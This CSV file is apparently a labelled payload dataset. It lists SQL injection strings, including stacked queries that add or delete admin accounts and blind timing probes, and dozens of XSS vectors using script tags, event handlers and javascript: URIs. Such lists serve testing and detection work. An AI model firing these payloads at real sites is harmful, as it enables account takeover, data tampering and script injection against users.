id,attack_class,payload,type,severity,context,description,example
sqli-074,sqli,"'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",stacked-queries,critical,User input,Using stacked queries to insert admin user,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--"
sqli-075,sqli,' OR pg_sleep(8)--,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL with double dash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(8)--
sqli-076,sqli,"' UNION SELECT @@version, NULL--",union,high,Search input,Using UNION SELECT to extract database version,"SELECT name, description FROM products WHERE name = '' UNION SELECT @@version, NULL--"
sqli-078,sqli,'; WAITFOR DELAY '0:0:8'--,blind-time,medium,User ID input,Using OR with sleep for time delay in SQL Server with double dash comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:8'--
sqli-079,sqli,"' OR SUBSTRING(@@version,1,1)='7'--",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection with double dash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='7'--"
sqli-081,sqli,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--,blind-time,medium,User input,Using OR with sleep for time delay in Oracle with double dash comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--
sqli-082,sqli,'; DELETE FROM users WHERE username='admin'--,stacked-queries,critical,User input,Using stacked queries to delete admin user,SELECT * FROM users WHERE username = ''; DELETE FROM users WHERE username='admin'--
sqli-083,sqli,' OR 0x42=0x42--,tautology,medium,Login username,Using OR with hex encoded tautology with double dash comment,SELECT * FROM users WHERE username = '' OR 0x42=0x42--
sqli-084,sqli,' OR SLEEP(13)--,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL with double dash comment,SELECT * FROM products WHERE name = '' OR SLEEP(13)--
sqli-086,sqli,' OR pg_sleep(14)--,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL with double dash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(14)--
sqli-088,sqli,"' OR SUBSTRING(user(),1,1)='d'--",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection with double dash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='d'--"
sqli-090,sqli,"'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--",stacked-queries,critical,User input,Using stacked queries to create new admin user,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--"
sqli-091,sqli,'; WAITFOR DELAY '0:0:9'--,blind-time,medium,User ID input,Using OR with sleepfor time delay in SQL Server with double dash comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:9'--
sqli-092,sqli,"' OR SUBSTRING(@@version,1,1)='6'--",boolean-blind,medium,Search input,Using OR with substring for blind boolean injection with double dash comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='6'--"
sqli-094,sqli,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--,blind-time,medium,User input,Using OR with sleep for time delay in Oracle with double dash comment,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--
sqli-096,sqli,' OR 0x43=0x43--,tautology,medium,Login username,Using OR with hex encoded tautology with double dash comment,SELECT * FROM users WHERE username = '' OR 0x43=0x43--
sqli-097,sqli,' OR SLEEP(14)--,blind-time,medium,Search input,Using OR with sleep for time delay in MySQL with double dash comment,SELECT * FROM products WHERE name = '' OR SLEEP(14)--
sqli-099,sqli,' OR pg_sleep(15)--,blind-time,medium,ID parameter,Using OR with sleep for time delay in PostgreSQL with double dash comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(15)--
sqli-100,sqli,'; UPDATE users SET password='securepass' WHERE username='admin'--,stacked-queries,critical,User input,Using stacked queries to update admin password with double dash comment,SELECT * FROM users WHERE username = ''; UPDATE users SET password='securepass' WHERE username='admin'--
xss-001,xss,<script>alert('XSS1')</script>,reflected,high,URL parameter,Basic reflected XSS with script tag,http://example.com/search?q=<script>alert('XSS1')</script>
xss-002,xss,<img src=x onerror=alert('XSS2')>,reflected,high,URL parameter,Reflected XSS with image tag and onerror event,http://example.com/search?q=<img src=x onerror=alert('XSS2')>
xss-003,xss,<script>alert('XSS3')</script>,stored,high,Comment input,Stored XSS with script tag in comment field,Submitting comment: <script>alert('XSS3')</script>
xss-004,xss,"<a href='javascript:alert(""XSS4"")'>click</a>",reflected,high,URL parameter,Reflected XSS with javascript: URI in anchor tag,"http://example.com/page?link=<a href='javascript:alert(""XSS4"")'>click</a>"
xss-005,xss,<input autofocus onfocus=alert('XSS5')>,reflected,high,URL parameter,Reflected XSS with input tag and onfocus event,http://example.com/search?q=<input autofocus onfocus=alert('XSS5')>
xss-006,xss,"<iframe src='javascript:alert(""XSS6"")'></iframe>",stored,high,User profile bio,Stored XSS with iframe tag,"User bio: <iframe src='javascript:alert(""XSS6"")'></iframe>"
xss-007,xss,<svg onload=alert('XSS7')>,reflected,high,URL parameter,Reflected XSS with SVG and onload event,http://example.com/search?q=<svg onload=alert('XSS7')>
xss-008,xss,<body onload=alert('XSS8')>,reflected,high,URL parameter,Reflected XSS with body tag and onload event,http://example.com/page?param=<body onload=alert('XSS8')>
xss-009,xss,<div onclick=alert('XSS9')>Click me</div>,stored,high,User input field,Stored XSS with event handler in div tag,User input: <div onclick=alert('XSS9')>Click me</div>
xss-010,xss,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>",reflected,high,URL parameter,Reflected XSS with meta refresh tag,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>"
xss-011,xss,"<style>body{background:url(""javascript:alert('XSS11')"")}</style>",reflected,high,URL parameter,Reflected XSS with style tag and expression,"http://example.com/page?param=<style>body{background:url(""javascript:alert('XSS11')"")}</style>"
xss-012,xss,%3Cscript%3Ealert('XSS12')%3C/script%3E,reflected,high,URL parameter,Reflected XSS with script tag and encoded payload,http://example.com/search?q=%3Cscript%3Ealert('XSS12')%3C/script%3E
xss-013,xss,<span onmouseover=alert('XSS13')>Hover me</span>,stored,high,User input field,Stored XSS with onmouseover event in span tag,User input: <span onmouseover=alert('XSS13')>Hover me</span>
xss-014,xss,"<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>",reflected,high,URL parameter,Reflected XSS with iframe and srcdoc attribute,"http://example.com/page?param=<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>"
xss-015,xss,"<object data='javascript:alert(""XSS15"")'></object>",reflected,high,URL parameter,Reflected XSS with object tag and data attribute,"http://example.com/page?param=<object data='javascript:alert(""XSS15"")'></object>"
xss-016,xss,<form onsubmit=alert('XSS16')><input type='submit'></form>,stored,high,User input field,Stored XSS with form tag and onsubmit event,User input: <form onsubmit=alert('XSS16')><input type='submit'></form>
xss-017,xss,<video src=x onerror=alert('XSS17')></video>,reflected,high,URL parameter,Reflected XSS with video tag and onerror event,http://example.com/page?param=<video src=x onerror=alert('XSS17')></video>
xss-018,xss,<audio src=x onerror=alert('XSS18')></audio>,reflected,high,URL parameter,Reflected XSS with audio tag and onerror event,http://example.com/page?param=<audio src=x onerror=alert('XSS18')></audio>
xss-019,xss,<textarea onfocus=alert('XSS19')>Focus me</textarea>,stored,high,User input field,Stored XSS with textarea and onfocus event,User input: <textarea onfocus=alert('XSS19')>Focus me</textarea>
xss-020,xss,"<math href='javascript:alert(""XSS20"")'>X</math>",reflected,high,URL parameter,Reflected XSS with math tag and href attribute,"http://example.com/page?param=<math href='javascript:alert(""X20"")'>X</math>"
xss-021,xss,"<base href=""javascript:alert('XSS21');//"">",reflected,high,URL parameter,Reflected XSS with base tag and href attribute,"http://example.com/page?param=<base href=""javascript:alert('XSS21');//"">"
xss-022,xss,"<a href='#' onclick='alert(""XSS22"")'>Click me</a>",stored,high,User input field,Stored XSS with anchor tag and onclick event,"User input: <a href='#' onclick='alert(""XSS22"")'>Click me</a>"
xss-023,xss,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>",reflected,high,URL parameter,Reflected XSS with meta tag and content attribute,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>"
xss-024,xss,"<button onclick='alert(""XSS24"")'>Click</button>",stored,high,User input field,Stored XSS with button tag and onclick event,"User input: <button onclick='alert(""XSS24"")'>Click</button>"
xss-025,xss,<form onreset=alert('XSS25')><input type='reset'></form>,reflected,high,URL parameter,Reflected XSS with form tag and onreset event,http://example.com/page?param=<form onreset=alert('XSS25')><input type='reset'></form>
xss-026,xss,<marquee onstart=alert('XSS26')>Scrolling text</marquee>,stored,high,User input field,Stored XSS with marquee tag and onstart event,User input: <marquee onstart=alert('XSS26')>Scrolling text</marquee>
xss-027,xss,"<embed src='javascript:alert(""XSS27"")'>",reflected,high,URL parameter,Reflected XSS with embed tag and src attribute,"http://example.com/page?param=<embed src='javascript:alert(""XSS27"")'>"
xss-028,xss,"<bgsound src='javascript:alert(""XSS28"")'>",stored,high,User input field,Stored XSS with bgsound tag and src attribute,"User input: <bgsound src='javascript:alert(""XSS28"")'>"
xss-029,xss,<xml onload=alert('XSS29')>,reflected,high,URL parameter,Reflected XSS with xml tag and onload event,http://example.com/page?param=<xml onload=alert('XSS29')>
xss-030,xss,"<iframe src='about:blank' onload='alert(""XSS30"")'></iframe>",stored,high,User input field,Stored XSS with iframe and onload event,"User input: <iframe src='about:blank' onload='alert(""XSS30"")'></iframe>"
xss-031,xss,<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>,reflected,high,URL parameter,Reflected XSS using SVG with animate element and begin attribute,http://example.com/page?param=<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>
xss-032,xss,"<base href=""javascript:alert('XSS32');//"">",stored,high,User profile input,Stored XSS using JavaScript URI in base tag,"User profile: <base href=""javascript:alert('XSS32');//"">"
xss-033,xss,<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>,reflected,high,URL parameter,Reflected XSS using malformed iframe with srcdoc and encoded script,http://example.com/page?param=<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>
xss-034,xss,"<div onpointerover='alert(""XSS34"")'>Hover me</div>",stored,high,User input field,Stored XSS using onpointerover event in div,"User input: <div onpointerover='alert(""XSS34"")'>Hover me</div>"
xss-035,xss,<script>alert(XSS35)</script>,reflected,high,URL parameter,Reflected XSS using malformed script tag with backticks,http://example.com/page?param=<script>alert(XSS35)</script>
xss-036,xss,<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>,stored,high,User input field,Stored XSS using SVG foreignObject with embedded HTML and script,User input: <svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>
xss-037,xss,"<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>",reflected,high,URL parameter,Reflected XSS using onanimationstart event in div,"http://example.com/page?param=<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>"
xss-038,xss,"<input oninput='alert(""XSS38"")'>",stored,high,User input field,Stored XSS using input tag with oninput event,"User input: <input oninput='alert(""XSS38"")'>"
xss-039,xss,<script>eval(alert('XSS39'))</script>,reflected,high,URL parameter,Reflected XSS using malformed script with template literals,http://example.com/page?param=<script>eval(alert('XSS39'))</script>
xss-040,xss,"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>",stored,high,User input field,Stored XSS using object tag with data URI,"User input: <object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>"
xss-041,xss,"<span onpointerdown='alert(""XSS41"")'>Click me</span>",reflected,high,URL parameter,Reflected XSS using onpointerdown event in span,"http://example.com/page?param=<span onpointerdown='alert(""XSS41"")'>Click me</span>"
xss-042,xss,"<math href='javascript:alert(""XSS42"")'>X</math>",stored,high,User input field,Stored XSS using math tag with href attribute and javascript URI,"User input: <math href='javascript:alert(""XSS42"")'>X</math>"
xss-043,xss,"<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>",reflected,high,URL parameter,Reflected XSS using iframe with sandbox attribute bypass,"http://example.com/page?param=<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>"
xss-044,xss,"<video oncanplay='alert(""XSS44"")'></video>",stored,high,User input field,Stored XSS using video tag with oncanplay event,"User input: <video oncanplay='alert(""XSS44"")'></video>"
xss-045,xss,"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>",reflected,high,URL parameter,Reflected XSS using meta tag with refresh and encoded javascript URI,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>"
xss-046,xss,"<svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>",stored,high,User input field,Stored XSS using svg with set attribute and onbegin event,"User input: <svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>"
xss-047,xss,"<script>setTimeout('alert(""XSS47"")',0)</script>",reflected,high,URL parameter,Reflected XSS using malformed script with setTimeout,"http://example.com/page?param=<script>setTimeout('alert(""XSS47"")',0)</script>"
xss-048,xss,"<details ontoggle='alert(""XSS48"")'><summary>Click me</summary></details>",stored,high,User input field,Stored XSS using details tag with ontoggle event,"User input: <details ontoggle='alert(""XSS48"")'><summary>Click me</summary</details>"
xss-049,xss,"<input formaction='javascript:alert(""XSS49"")' type='submit'>",reflected,high,URL parameter,Reflected XSS using input tag with formaction attribute,"http://example.com/page?param=<input formaction='javascript:alert(""XSS49"")' type='submit'>"
